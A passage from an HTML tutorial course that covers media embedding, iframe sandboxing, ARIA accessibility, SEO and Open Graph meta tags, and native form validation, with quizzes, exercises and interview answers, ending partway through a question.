Only for the characters that have syntactic meaning (`<`, `>`, `&`, quotes in attributes) and for characters that are invisible or easy to confuse in source, such as the non-breaking space and the soft hyphen, where a numeric reference makes the intent visible. Everything else, including curly quotes, dashes and Urdu text, should be typed as UTF-8 characters with `<meta charset="UTF-8">` declared. In generated documents I also use numeric references when the template engine's output encoding is out of my control, for example when a client's CMS re-encodes uploaded HTML.

**Q: What is mojibake and how do you fix it?**
Mojibake is text decoded with the wrong encoding, producing sequences like `â€™` for a curly apostrophe or `Ã©` for é. It happens when a file's bytes are UTF-8 but the reader assumes Windows-1252, or the reverse. The fix is at the source: save as UTF-8, declare it in the first 1024 bytes with `<meta charset="UTF-8">`, and make sure the HTTP `Content-Type` header agrees, since the header wins over the meta tag. In Python I read with `open(path, encoding="utf-8")` explicitly and never rely on the platform default, which on Windows is still cp1252 in some tools.

## Audio, video & iframes

Rich media turns a static handbook into a training portal: a screen recording of the rate calculator, a narrated SOP, an embedded map to the office. HTML5 handles audio and video natively, and `<iframe>` embeds an entire other page, from a YouTube player to a PDF preview.

### Video

```html
<video controls width="640" height="360" poster="thumb.jpg" preload="metadata">
  <source src="rate-calc-demo.webm" type="video/webm">
  <source src="rate-calc-demo.mp4" type="video/mp4">
  <track kind="subtitles" src="rate-calc-demo.en.vtt" srclang="en" label="English" default>
  Your browser does not support HTML video. <a href="rate-calc-demo.mp4">Download the MP4</a>.
</video>
```

- `controls` shows play, pause, volume and fullscreen. Without it the video is invisible to the user's control unless script drives it.
- Several `<source>` elements let the browser pick the first format it can play; MP4 (H.264 + AAC) is universal, WebM is smaller.
- `poster` is the frame shown before playback. `preload="metadata"` fetches only duration and dimensions, saving bandwidth; `none` fetches nothing, `auto` may fetch the whole file.
- `<track>` attaches WebVTT captions or subtitles; captions are a WCAG requirement for training material.
- The text inside is the fallback for ancient browsers.

Other attributes: `autoplay` (only works together with `muted` in modern browsers), `loop`, `muted`, `playsinline` (iOS plays inline instead of fullscreen).

| Attribute | Effect |
|---|---|
| `controls` | Show native player UI |
| `autoplay muted` | Start silently; policy blocks autoplay with sound |
| `loop` | Restart at end |
| `poster` | Preview image |
| `preload` | `none` / `metadata` / `auto` |
| `playsinline` | Inline playback on iPhone |

### Audio

```html
<audio controls preload="none">
  <source src="sop-14-narration.mp3" type="audio/mpeg">
  <source src="sop-14-narration.ogg" type="audio/ogg">
  <a href="sop-14-narration.mp3">Download the narration (MP3, 6 MB)</a>
</audio>
```

`<audio>` works the same way with the same attributes minus `poster`, `width` and `height`. MP3 plays everywhere; Ogg Vorbis and Opus are smaller but Safari support is uneven. EPUB3 supports both `<audio>` and `<video>` for enhanced ebooks, though many e-readers ignore them, so always provide a text alternative.

### Iframes

An `<iframe>` (inline frame) embeds another HTML document inside the current one, in its own browsing context.

```html
<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ"
        width="560" height="315"
        title="Rate calculator walkthrough"
        loading="lazy"
        allow="fullscreen; picture-in-picture"
        referrerpolicy="strict-origin-when-cross-origin"></iframe>
```

- `title` is mandatory for accessibility: it is the only name a screen reader has for the frame.
- `loading="lazy"` defers loading until the frame nears the viewport.
- `allow` is a permissions policy: fullscreen, camera, microphone, geolocation and so on are blocked unless listed.
- `sandbox` locks the embedded page down. `sandbox=""` blocks scripts, forms and popups; add tokens like `allow-scripts allow-same-origin` to re-enable specific things. Use it for any content you do not control.

```html
<iframe src="preview.html" title="Handbook preview" sandbox="allow-same-origin"></iframe>
<iframe src="handbook.pdf#page=3" title="Handbook, page 3" width="100%" height="600"></iframe>
```

The second example embeds a PDF using the browser's built-in viewer; `#page=3` opens at page three, and `#zoom=100` sets the zoom, which is handy for showing Fiverr clients a proof without a download.

### Embedding third-party content responsibly

An iframe runs someone else's page inside yours. It can set cookies, run scripts and, without `sandbox`, open popups. The embedded site can also refuse to be framed with the `X-Frame-Options: DENY` header or a `Content-Security-Policy: frame-ancestors` directive, which is why some URLs show a blank frame; that is their choice, not your bug. Google Maps, YouTube and Vimeo provide dedicated embed URLs designed for framing.

### Object and embed

`<object data="file.pdf" type="application/pdf">` and the older `<embed>` also display PDFs and plugins. `<iframe>` has better accessibility and consistent behaviour, so prefer it; use `<object>` only when you need fallback content shown when the type is unsupported.

> **Tip:** WeasyPrint ignores `<video>`, `<audio>` and `<iframe>` entirely. For a printed handbook, wrap media in a `<figure>` with a `<figcaption>` that includes a short URL or QR code, and hide the player with `@media print { video, audio, iframe { display: none } }`.

### Try It Yourself

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Media</title>
<style>body{font-family:Arial,sans-serif;margin:2rem} figure{margin:1rem 0} iframe{border:1px solid #ccc}</style></head>
<body>
  <h1>Training media</h1>
  <figure>
    <video controls width="480" muted preload="metadata"
           src="https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.webm">
      Your browser does not support video.
    </video>
    <figcaption>Video 1. Sample clip with native controls.</figcaption>
  </figure>
  <figure>
    <audio controls preload="none"
           src="https://interactive-examples.mdn.mozilla.net/media/cc0-audio/t-rex-roar.mp3"></audio>
    <figcaption>Audio 1. Sample narration track.</figcaption>
  </figure>
  <figure>
    <iframe srcdoc="<p style='font-family:Arial'>This is a sandboxed inline document. Scripts are blocked here.</p><script>document.body.style.background='red'</script>"
            title="Sandboxed demo" width="480" height="80" sandbox=""></iframe>
    <figcaption>Iframe 1. The red-background script never runs because of <code>sandbox=""</code>.</figcaption>
  </figure>
</body>
</html>
```

### Quiz

1. Why list several `<source>` elements inside `<video>`?
- [x] The browser plays the first format it supports
- [ ] All of them play at once
- [ ] It is required by the HTML spec
> Format support differs; MP4 is the universal fallback.

2. Which attribute is required on `<iframe>` for accessibility?
- [ ] `name`
- [x] `title`
- [ ] `alt`
> Screen readers announce the `title` as the frame's name.

3. What does `sandbox=""` do?
- [ ] Nothing until tokens are added
- [x] Applies all restrictions: no scripts, forms, popups or same-origin access
- [ ] Makes the frame fullscreen
> An empty sandbox is the most restrictive; tokens re-enable features one by one.

4. Which combination allows autoplay in modern browsers?
- [ ] `autoplay` alone
- [x] `autoplay muted`
- [ ] `autoplay controls`
> Autoplay policies block sound; muted autoplay is permitted.

### Exercises

1. **Captioned training video** — Embed `qc-walkthrough.mp4` with controls, a poster image `qc.jpg`, English subtitles from `qc.vtt`, and a download fallback.
<details><summary>Solution</summary>

```html
<video controls poster="qc.jpg" width="640" height="360" preload="metadata">
  <source src="qc-walkthrough.mp4" type="video/mp4">
  <track kind="subtitles" src="qc.vtt" srclang="en" label="English" default>
  <a href="qc-walkthrough.mp4">Download the walkthrough (MP4)</a>
</video>
```

</details>

2. **PDF proof** — Embed `proof.pdf` opened at page 5 in a frame 100% wide and 700px tall with an accessible title.
<details><summary>Solution</summary>

```html
<iframe src="proof.pdf#page=5" title="Client proof, page 5" width="100%" height="700"></iframe>
```

</details>

### Interview Questions

**Q: What are the security implications of an iframe?**
The framed document runs in its own browsing context with its own origin, so the same-origin policy prevents it from reading your page's DOM and vice versa unless both share an origin. But it can still run scripts, set its own cookies, open popups, navigate the top window in some cases, and phish users with look-alike UI. `sandbox` removes those capabilities selectively, `allow` restricts powerful APIs like camera and geolocation, and `referrerpolicy` limits what URL the framed site learns. On the other side, your site should send `X-Frame-Options` or `CSP frame-ancestors` to stop others framing it for clickjacking. Interviewers like hearing both directions of the threat.

**Q: How do you make a video accessible?**
Provide captions via `<track kind="captions">` in WebVTT for the dialogue and important sounds, a transcript on the page for people who prefer reading or use braille displays, and audio description if visuals carry meaning not spoken aloud. Keep native `controls` so keyboard users can operate it, never autoplay with sound, and make sure the poster or surrounding text explains what the video is. WCAG 2.1 Level AA requires captions for pre-recorded video, which is the standard most US clients cite in their statements of work.

**Q: Why does an embedded YouTube link sometimes show a blank frame?**
Because the URL is a watch page, not an embed URL. YouTube sends `X-Frame-Options: SAMEORIGIN` on `watch?v=` pages so they cannot be framed, while `youtube.com/embed/VIDEO_ID` and `youtube-nocookie.com/embed/` are designed for iframes. The same applies to many sites that protect themselves from clickjacking. Checking the response headers in DevTools' Network tab gives the answer in seconds.

# LEVEL: Advanced

## Accessibility: ARIA, alt text & landmarks

Accessibility (often written a11y) means people who use screen readers, keyboards only, magnifiers, voice control or switch devices can use your page. In the US, where most of your clients are, it is also a legal requirement under the ADA and Section 508, and statements of work increasingly cite **WCAG 2.1 Level AA**. The good news: HTML written the way this course teaches is 80% of the job. ARIA is for the remaining 20%.

### Start with native semantics

The first rule of ARIA is "do not use ARIA" when an HTML element already carries the meaning. `<button>` is focusable, keyboard-operable and announced as a button for free; `<div role="button" tabindex="0" onclick>` needs three attributes and a keydown handler to match it.

| Do this | Not this |
|---|---|
| `<button>` | `<div onclick>` |
| `<a href>` | `<span class="link">` |
| `<nav>` | `<div role="navigation">` |
| `<label for>` | `aria-label` on an input with visible text nearby |
| `<table>` with `<th scope>` | `<div class="row">` grids |

### Landmarks

Screen readers offer a landmark list (VoiceOver rotor, NVDA's D key) that jumps between regions. Semantic elements produce landmarks automatically: `<header>` is `banner`, `<nav>` is `navigation`, `<main>` is `main`, `<aside>` is `complementary`, `<footer>` is `contentinfo`, `<form>` and `<section>` become landmarks when they have an accessible name. Give repeated landmarks names so the list is meaningful:

```html
<nav aria-label="Main">…</nav>
<nav aria-label="Chapter contents">…</nav>
<section aria-labelledby="summary-h"><h2 id="summary-h">Summary</h2>…</section>
```

### Text alternatives

Every non-text element needs a text alternative: `alt` on images, `<track>` on video, `title` on iframes, `aria-label` on icon buttons.

```html
<button aria-label="Close dialog"><svg aria-hidden="true">…</svg></button>
<img src="signature.png" alt="">  <!-- decorative: empty alt -->
<img src="chart.png" alt="QA accuracy rose from 91% to 96% in Q3">
```

`aria-hidden="true"` removes the icon from the accessibility tree so the button's label is read once, cleanly.

### The three kinds of ARIA attributes

- **Roles** say what a thing is: `role="dialog"`, `role="alert"`, `role="tablist"`. Use them only on generic elements when no native element fits.
- **Properties** describe relationships: `aria-label`, `aria-labelledby`, `aria-describedby`, `aria-controls`.
- **States** change at runtime and must be updated by script: `aria-expanded`, `aria-selected`, `aria-checked`, `aria-hidden`, `aria-invalid`.

```html
<button aria-expanded="false" aria-controls="matrix-panel">Show escalation matrix</button>
<div id="matrix-panel" hidden>…</div>
```

When the script reveals the panel it must also set `aria-expanded="true"`; ARIA never changes behaviour on its own, it only *announces*. A `role="button"` on a `<div>` does not make it clickable by keyboard.

### Live regions

Content that changes without a page load, such as "Form saved" or a validation summary, is silent to screen readers unless it is in a live region.

```html
<p role="status" aria-live="polite" id="save-msg"></p>
<p role="alert">3 fields need attention before you can submit.</p>
```

`polite` waits for the user to pause; `assertive` (implied by `role="alert"`) interrupts. Use assertive only for errors.

### Keyboard and focus

Everything clickable must be reachable with Tab and operable with Enter or Space. `tabindex="0"` adds a custom element to the tab order; `tabindex="-1"` makes it focusable by script only; positive values are a bug because they scramble the order. Never remove the focus outline without providing a visible replacement (`:focus-visible` in CSS). Skip links let keyboard users jump past a long menu:

```html
<a href="#main" class="skip-link">Skip to main content</a>
…
<main id="main" tabindex="-1">
```

### Colour and contrast

WCAG AA needs a contrast ratio of at least 4.5:1 for normal text and 3:1 for large text and UI components. The brand orange `#E34F26` on white is about 3.9:1, fine for large headings, not for body text. Never convey meaning by colour alone; add an icon or text ("Failed ✗").

> **Interview note:** The most common a11y question is "what is ARIA and when should you use it?" The model answer: ARIA adds roles, states and properties to the accessibility tree for custom widgets that native HTML cannot express; it never adds behaviour; and the first rule of ARIA is to prefer native elements.

### Testing

Run Lighthouse (Chrome DevTools > Lighthouse) and the axe DevTools extension, then tab through the page with the mouse unplugged, then listen with NVDA (Windows, free) or VoiceOver (macOS). Automated tools catch about a third of issues; keyboard and screen reader passes find the rest.

### Try It Yourself

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Accessible widgets</title>
<style>
  body{font-family:Arial,sans-serif;margin:2rem}
  .skip-link{position:absolute;left:-999px} .skip-link:focus{left:1rem;top:1rem;background:#ff0;padding:.5rem}
  button{padding:.5rem 1rem} button:focus-visible{outline:3px solid #005fcc;outline-offset:2px}
  [hidden]{display:none}
</style></head>
<body>
  <a href="#main" class="skip-link">Skip to main content</a>
  <nav aria-label="Main"><a href="#">Home</a> · <a href="#">Reports</a></nav>
  <main id="main" tabindex="-1">
    <h1>Escalation policy</h1>
    <button id="tog" aria-expanded="false" aria-controls="panel">Show escalation matrix</button>
    <div id="panel" hidden><p>Level 1: team lead. Level 2: operations manager.</p></div>
    <p role="status" aria-live="polite" id="msg"></p>
    <p><img src="https://placehold.co/120x40/ccc/333?text=logo" alt="" width="120" height="40"> (decorative image, empty alt)</p>
  </main>
  <script>
    const b=document.getElementById('tog'), p=document.getElementById('panel'), m=document.getElementById('msg');
    b.addEventListener('click',()=>{const open=p.hidden; p.hidden=!open; b.setAttribute('aria-expanded',String(open));
      b.textContent=(open?'Hide':'Show')+' escalation matrix'; m.textContent=open?'Matrix expanded':'Matrix collapsed';});
  </script>
</body>
</html>
```

### Quiz

1. What is the first rule of ARIA?
- [x] Prefer a native HTML element that already has the semantics
- [ ] Add `role` to every element
- [ ] Use `aria-label` instead of `<label>`
> ARIA is a fallback for custom widgets, not a replacement for HTML semantics.

2. Which attribute must a script update when a disclosure button opens its panel?
- [ ] `aria-label`
- [x] `aria-expanded`
- [ ] `aria-live`
> States like `aria-expanded` reflect runtime changes and are the developer's responsibility.

3. What minimum contrast ratio does WCAG AA require for body text?
- [ ] 3:1
- [x] 4.5:1
- [ ] 7:1
> 4.5:1 is AA for normal text; 3:1 for large text; 7:1 is AAA.

4. Which `tabindex` value is considered a bug?
- [ ] `0`
- [ ] `-1`
- [x] `5`
> Positive values override the natural order and confuse keyboard navigation.

### Exercises

1. **Icon button** — Mark up a delete button that shows only a trash icon (an inline SVG) and is announced as "Delete order".
<details><summary>Solution</summary>

```html
<button type="button" aria-label="Delete order">
  <svg aria-hidden="true" width="16" height="16" viewBox="0 0 16 16"><path d="M2 4h12M6 4V2h4v2M4 4l1 10h6l1-10"/></svg>
</button>
```

</details>

2. **Error message** — Add an inline error to a required "Order number" input so a screen reader reads the error with the field and knows the field is invalid.
<details><summary>Solution</summary>

```html
<label for="order">Order number</label>
<input id="order" name="order" required aria-invalid="true" aria-describedby="order-err">
<p id="order-err" role="alert">Enter the order number in the form TX-2026-000000.</p>
```

</details>

### Interview Questions

**Q: What is the accessibility tree?**
It is a parallel tree the browser builds from the DOM for assistive technology, containing each element's role, name, state and properties, with purely presentational nodes removed. Native elements populate it automatically: a `<button>` has role button and its text as the name. ARIA attributes override or add to those computed values, and `aria-hidden` removes a subtree. Understanding it explains why a `<div onclick>` is invisible to a screen reader and why the accessible name computation (aria-labelledby, then aria-label, then content, then title) decides what is announced. Chrome DevTools shows the tree in the Accessibility pane.

**Q: How would you make a custom dropdown accessible, and would you build one?**
I would first ask whether a native `<select>` works, because it is keyboard- and screen-reader-ready everywhere. If the design truly needs a custom one, it must follow the ARIA combobox or listbox pattern: the trigger gets `role="combobox"` with `aria-expanded` and `aria-controls`, the list gets `role="listbox"`, options get `role="option"` and `aria-selected`, focus is managed so arrow keys move through options, Escape closes, and typing jumps to matches. That is several hundred lines of tested JavaScript, which is why "use the native control" is the senior answer and "here is the pattern" is the proof you could do it anyway.

**Q: How do you approach accessibility in a generated PDF or EPUB?**
The same principles apply, and HTML is the easiest source to get them right. Correct heading order gives the PDF a bookmark tree and the EPUB a navigation document; `alt` text on images maps to PDF/UA alternative text and EPUB accessibility metadata; `lang` gives the reader the right voice; real tables with `<th>` become tagged tables. WeasyPrint has produced tagged PDF (PDF/UA) since version 62 with the `pdf_variant="pdf/ua-1"` option, and epubcheck plus the Ace by DAISY tool audit EPUBs. Clients in education and government ask for exactly these checks.

## SEO, meta tags & Open Graph

Search engine optimisation starts in the `<head>`. Long before anyone thinks about backlinks, the title, description, canonical URL and structured data decide how a page appears in Google and how it looks when someone pastes the link into WhatsApp, LinkedIn or Slack. For a freelancer, a portfolio page that unfurls with a clean preview card is a sales tool.

### Title and description

```html
<title>Fillable PDF Forms & Branded Word Templates | Ali Raza</title>
<meta name="description" content="Document production specialist: fillable AcroForm PDFs, .dotx template suites, EPUB3 ebooks and automated reports. 400+ five-star reviews.">
```

The title is the headline in search results. Keep it under about 60 characters, put the key phrase first and the brand last. The description is the grey snippet; 150–160 characters, a real sentence, containing the terms someone would search for. Google rewrites either when it thinks it knows better, but a good one is used most of the time. Neither influences ranking much directly; they influence *clicks*, which do.

### Robots and canonical

```html
<meta name="robots" content="index, follow">
<meta name="robots" content="noindex, nofollow">   <!-- for staging or thank-you pages -->
<link rel="canonical" href="https://alirazadocs.com/services/pdf-forms/">
```

`robots` tells crawlers whether to index the page and follow links. The canonical link says "this is the master copy", which fixes duplicate-content problems when the same page is reachable at `?utm=…` URLs or with and without a trailing slash. A wrong canonical can de-index a page, so it must be an absolute URL to the preferred version.

### Open Graph and Twitter cards

Open Graph (`og:`) tags, created by Facebook and used by LinkedIn, WhatsApp, Slack and Discord, describe the preview card. Twitter (X) reads `og:` tags but has its own `twitter:` set for card type.

```html
<meta property="og:type" content="website">
<meta property="og:title" content="Fillable PDF Forms & Branded Word Templates">
<meta property="og:description" content="AcroForm PDFs, .dotx suites, EPUB3 ebooks. 400+ reviews.">
<meta property="og:image" content="https://alirazadocs.com/img/og-card.png">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:url" content="https://alirazadocs.com/">
<meta name="twitter:card" content="summary_large_image">
```

Note the attribute: Open Graph uses `property`, everything else uses `name`. The image must be an absolute URL, at least 1200×630 px, under 5 MB, and not behind authentication. Test with the LinkedIn Post Inspector or opengraph.xyz; the platforms cache aggressively, so change the image file name when you update it.

| Tag | Where it shows |
|---|---|
| `<title>` | Google result headline, browser tab |
| `meta description` | Google snippet |
| `og:title`, `og:description`, `og:image` | LinkedIn, WhatsApp, Slack, Facebook cards |
| `twitter:card` | X card style |
| `link rel=canonical` | Tells Google the master URL |
| `meta robots` | Index / no-index |

### Structured data with JSON-LD

Structured data lets Google show rich results: star ratings, FAQ dropdowns, breadcrumbs, article dates. The recommended format is JSON-LD in a script tag, using schema.org vocabulary.

```html
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Person",
  "name": "Ali Raza",
  "jobTitle": "Document Production & Automation Specialist",
  "url": "https://alirazadocs.com/",
  "sameAs": ["https://www.fiverr.com/aliraza", "https://www.upwork.com/freelancers/aliraza"]
}
</script>
```

Other useful types: `Article` (with `datePublished`), `FAQPage`, `BreadcrumbList`, `Product` with `AggregateRating`. Validate with Google's Rich Results Test; invalid JSON is silently ignored.

### Semantic HTML is SEO

Crawlers weight the `<h1>`, the first paragraph, `<strong>` text, link anchor text and `alt` attributes. A page built with `<main>`, `<article>`, one `<h1>` and descriptive links is already optimised. Fast pages rank better too (Core Web Vitals), which links SEO to the performance chapter.

### Language and hreflang

For an English/Urdu site, tell Google which version serves which audience:

```html
<link rel="alternate" hreflang="en" href="https://alirazadocs.com/">
<link rel="alternate" hreflang="ur" href="https://alirazadocs.com/ur/">
<link rel="alternate" hreflang="x-default" href="https://alirazadocs.com/">
```

> **Warning:** `<meta name="keywords">` has been ignored by Google since 2009. Filling it with terms wastes bytes and can look like spam to some engines. Spend the effort on the description and on the actual page content.

### Try It Yourself

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Fillable PDF Forms & Branded Word Templates | Ali Raza</title>
  <meta name="description" content="Fillable AcroForm PDFs, .dotx template suites, EPUB3 ebooks and automated reports. 400+ five-star reviews.">
  <link rel="canonical" href="https://alirazadocs.com/">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Fillable PDF Forms & Branded Word Templates">
  <meta property="og:description" content="AcroForm PDFs, .dotx suites, EPUB3 ebooks. 400+ reviews.">
  <meta property="og:image" content="https://alirazadocs.com/img/og-card.png">
  <meta property="og:url" content="https://alirazadocs.com/">
  <meta name="twitter:card" content="summary_large_image">
  <script type="application/ld+json">
  {"@context":"https://schema.org","@type":"Person","name":"Ali Raza","jobTitle":"Document Production & Automation Specialist","url":"https://alirazadocs.com/"}
  </script>
  <style>body{font-family:Arial,sans-serif;margin:2rem} pre{background:#f4f4f4;padding:1rem;overflow:auto}</style>
</head>
<body>
  <main>
    <h1>Fillable PDF Forms &amp; Branded Word Templates</h1>
    <p>This page's head tags are printed below by a tiny script, so you can inspect what a crawler sees.</p>
    <pre id="out"></pre>
  </main>
  <script>
    document.getElementById('out').textContent =
      [...document.head.querySelectorAll('title, meta[name], meta[property], link[rel=canonical]')]
        .map(e => e.outerHTML).join('\n');
  </script>
</body>
</html>
```

### Quiz

1. Which attribute do Open Graph tags use?
- [ ] `name`
- [x] `property`
- [ ] `rel`
> `og:*` tags are written `<meta property="og:title">`; other metas use `name`.

2. What does `<link rel="canonical">` do?
- [x] Declares the preferred URL among duplicates
- [ ] Preloads the stylesheet
- [ ] Blocks indexing
> It consolidates duplicate URLs so ranking signals go to one page.

3. Which meta tag has no effect on Google ranking?
- [ ] `description`
- [x] `keywords`
- [ ] `robots`
> Google stopped using the keywords meta tag in 2009.

4. What is the recommended minimum size for an `og:image`?
- [ ] 300×300
- [x] 1200×630
- [ ] 100×100
> 1200×630 (1.91:1) renders as a large card on LinkedIn, Facebook and X.

### Exercises

1. **Portfolio head** — Write title, description, canonical and Open Graph tags for a page at `https://alirazadocs.com/epub/` about EPUB3 conversion services.
<details><summary>Solution</summary>

```html
<title>EPUB3 Ebook Conversion & Formatting | Ali Raza</title>
<meta name="description" content="Manuscript to validated EPUB3 with working TOC, embedded fonts and Kindle-ready output. Fixed-price, fast turnaround.">
<link rel="canonical" href="https://alirazadocs.com/epub/">
<meta property="og:type" content="website">
<meta property="og:title" content="EPUB3 Ebook Conversion & Formatting">
<meta property="og:description" content="Validated EPUB3 with working TOC and embedded fonts.">
<meta property="og:image" content="https://alirazadocs.com/img/og-epub.png">
<meta property="og:url" content="https://alirazadocs.com/epub/">
```

</details>

2. **FAQ structured data** — Write JSON-LD for one FAQ: "Do you validate EPUBs?" / "Yes, every file passes epubcheck before delivery."
<details><summary>Solution</summary>

```html
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"FAQPage","mainEntity":[{"@type":"Question","name":"Do you validate EPUBs?","acceptedAnswer":{"@type":"Answer","text":"Yes, every file passes epubcheck before delivery."}}]}
</script>
```

</details>

### Interview Questions

**Q: How does HTML structure affect SEO?**
Crawlers use the same signals as assistive technology: one clear `<h1>`, a logical heading outline, descriptive link text, `alt` on images and semantic landmarks help Google understand what the page is about and which part is the main content. Structured data adds explicit meaning that unlocks rich results. Performance matters too, because Core Web Vitals are a ranking signal, and bloated markup slows the first paint. The title and description do not rank the page but decide the click-through rate, which does influence ranking over time. So SEO is mostly "write good HTML for humans", plus a handful of head tags.

**Q: What is the difference between `noindex` and `robots.txt` Disallow?**
`robots.txt` stops well-behaved crawlers from *fetching* a URL, but the URL can still appear in results if other sites link to it, shown without a snippet. `<meta name="robots" content="noindex">` (or the `X-Robots-Tag` header) requires the page to be fetched and then tells the engine not to index it, which reliably removes it. So for a staging site or a thank-you page you use `noindex`, and you must not also block it in robots.txt or Google never sees the noindex. Candidates who know that interaction stand out.

**Q: Why does a link preview show an old image after you updated `og:image`?**
Social platforms cache the scraped Open Graph data, sometimes for weeks. The fix is to serve the new image under a new file name or query string and re-scrape with the platform's debugger (LinkedIn Post Inspector, Facebook Sharing Debugger). Also check that the image is publicly reachable, under 5 MB and served with a correct `Content-Type`, since a blocked or wrong-typed image silently falls back to the old cache.

## Form validation attributes

Before JavaScript, before the server, the browser itself can reject bad input using **constraint validation**: a handful of HTML attributes that stop a form submitting until the values are acceptable. It costs nothing, works without script, and gives instant feedback. Server-side validation is still mandatory (the browser can be bypassed with one DevTools edit), but client-side validation is what makes a form pleasant.

### The constraint attributes

| Attribute | Applies to | Rule |
|---|---|---|
| `required` | Most inputs, select, textarea | Must not be empty |
| `minlength` / `maxlength` | Text-like inputs, textarea | Character count |
| `min` / `max` | number, range, date, time | Numeric or date bounds |
| `step` | number, range, date, time | Allowed increments (`step="0.01"` for money, `any` to disable) |
| `pattern` | Text-like inputs | Regular expression the whole value must match |
| `type` | input | `email`, `url`, `number`, `date` carry their own format rules |
| `accept` | file | Filters the picker (`.docx,.pdf` or `application/pdf`); not enforced on submit |

```html
<label for="order">Order number</label>
<input id="order" name="order" required pattern="[A-Z]{2}-\d{4}-\d{6}"
       title="Two-letter state, year, six digits, e.g. TX-2026-041877">

<label for="amount">Policy amount (USD)</label>
<input id="amount" name="amount" type="number" min="10000" max="5000000" step="1000" required>

<label for="close">Closing date</label>
<input id="close" name="close" type="date" min="2026-09-15" required>
```

`pattern` is matched against the entire value (the browser wraps it in `^(?:…)$`) using JavaScript regex syntax with the `v` flag in current browsers, so escape literal hyphens and dots. The `title` attribute is shown in the error bubble, so use it to describe the expected format.

### What happens on submit

When the user clicks a submit button, the browser checks every control. If any is invalid, submission stops, the first invalid control receives focus and a native tooltip appears with a message. The invalid control also matches the CSS `:invalid` pseudo-class, and after interaction `:user-invalid` (Chrome 119+, Firefox 88+, Safari 16.5+), which is the one you want for red borders because it does not flag empty fields before the user has touched them.

```css
input:user-invalid { border-color: #c00; }
input:user-valid   { border-color: #080; }
```

### Turning validation off

`novalidate` on the `<form>` disables the built-in checks so you can run your own. `formnovalidate` on a specific button skips checks for that button only, which is right for "Save draft".

```html
<form action="/orders" method="post" novalidate>
  …
  <button type="submit" formnovalidate name="draft" value="1">Save draft</button>
  <button type="submit">Submit order</button>
</form>
```

### The JavaScript side of the same API

Every control exposes `validity` (a `ValidityState` with booleans such as `valueMissing`, `patternMismatch`, `rangeUnderflow`, `typeMismatch`), `validationMessage`, `checkValidity()` and `reportValidity()`. `setCustomValidity("text")` marks a control invalid with your own message, and `setCustomValidity("")` clears it. That is how you implement cross-field rules like "end date after start date" while still using the native error UI.

```html
<script>
const start = document.querySelector('#start'), end = document.querySelector('#end');
end.addEventListener('input', () => {
  end.setCustomValidity(end.value && end.value < start.value ? 'End date must be after the start date.' : '');
});
</script>
```

### Autofill and input hints

`autocomplete` values (`name`, `email`, `tel`, `street-address`, `postal-code`, `cc-number`, `one-time-code`) let browsers fill fields correctly and are a WCAG 2.1 requirement for personal data fields. `inputmode="numeric"` shows a number keypad for a text field such as a ZIP code without turning it into `type="number"`, which would strip leading zeros. `spellcheck="false"` on order numbers stops the red squiggle.

> **Tip:** `type="number"` is wrong for identifiers (ZIP codes, phone numbers, order numbers): it drops leading zeros, allows `e` for exponents and adds spinners. Use `type="text"` with `inputmode="numeric"` and a `pattern`.

### Try It Yourself

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Validation</title>
<style>
  body{font-family:Arial,sans-serif;margin:2rem;max-width:480px}
  label{display:block;margin-top:.8rem;font-weight:bold}
  input{width:100%;padding:.4rem;box-sizing:border-box;border:2px solid #ccc}
  input:user-invalid{border-color:#c00} input:user-valid{border-color:#080}
  button{margin-top:1rem;padding:.5rem 1rem}
</style></head>
<body>
<form onsubmit="event.preventDefault(); document.getElementById('ok').textContent='Submitted: '+JSON.stringify(Object.fromEntries(new FormData(this)))">
  <label for="order">Order number (TX-2026-041877)</label>
  <input id="order" name="order" required pattern="[A-Z]{2}-\d{4}-\d{6}" title="Two-letter state, year, six digits" spellcheck="false">
  <label for="email">Email</label>
  <input id="email" name="email" type="email" required autocomplete="email">
  <label for="amount">Policy amount (10,000–5,000,000, steps of 1,000)</label>
  <input id="amount" name="amount" type="number" min="10000" max="5000000" step="1000" required>
  <label for="zip">ZIP code</label>
  <input id="zip" name="zip" inputmode="numeric" pattern="\d{5}" maxlength="5" required autocomplete="postal-code">
  <label for="start">Start date</label><input id="start" name="start" type="date" required>
  <label for="end">End date</label><input id="end" name="end" type="date" required>
  <button type="submit" formnovalidate name="draft" value="1">Save draft</button>
  <button type="submit">Submit</button>
</form>
<p id="ok"></p>
<script>
  const s=document.getElementById('start'), e=document.getElementById('end');
  e.addEventListener('input',()=>e.setCustomValidity(e.value && e.value<s.value ? 'End date must be after the start date.' : ''));
</script>
</body>
</html>
```

### Quiz

1. Which attribute disables native validation for the whole form?
- [ ] `nocheck`
- [x] `novalidate`
- [ ] `formnovalidate`
> `novalidate` goes on `<form>`; `formnovalidate` goes on one submit button.

2. How is a `pattern` regex applied?
- [x] Against the entire value, as if wrapped in `^(?:…)$`
- [ ] As a substring search
- [ ] Only to the first character
> A partial match is not enough; the whole value must match.

3. Which method marks a control invalid with a custom message?
- [ ] `reportValidity("msg")`
- [x] `setCustomValidity("msg")`
- [ ] `validity.custom = "msg"`
> Pass an empty string later to clear the custom error.

4. Why avoid `type="number"` for a ZIP code?
- [ ] It is too slow
- [x] It strips leading zeros and accepts exponent notation
- [ ] It cannot be `required`
> Identifiers are text; use `inputmode="numeric"` for the keypad.

### Exercises

1. **Percentage field** — Build a QA accuracy input that accepts 0–100 with two decimals, required, with a helpful error message.
<details><summary>Solution</summary>

```html
<label for="acc">Accuracy (%)</label>
<input id="acc" name="acc" type="number" min="0" max="100" step="0.01" required title="0 to 100, up to two decimals">
```

</details>

2. **Confirm password** — Write the script that makes a confirm field invalid when it differs from the password field.
<details><summary>Solution</summary>

```html
<input id="pw" type="password" name="pw" required minlength="12">
<input id="pw2" type="password" name="pw2" required>
<script>
const pw = document.getElementById('pw'), pw2 = document.getElementById('pw2');
function check(){ pw2.setCustomValidity(pw2.value !== pw.value ? 'Passwords do not match.' : ''); }
pw.addEventListener('input', check); pw2.addEventListener('input', check);
</script>
```

</details>

### Interview Questions

**Q: Is client-side validation enough?**
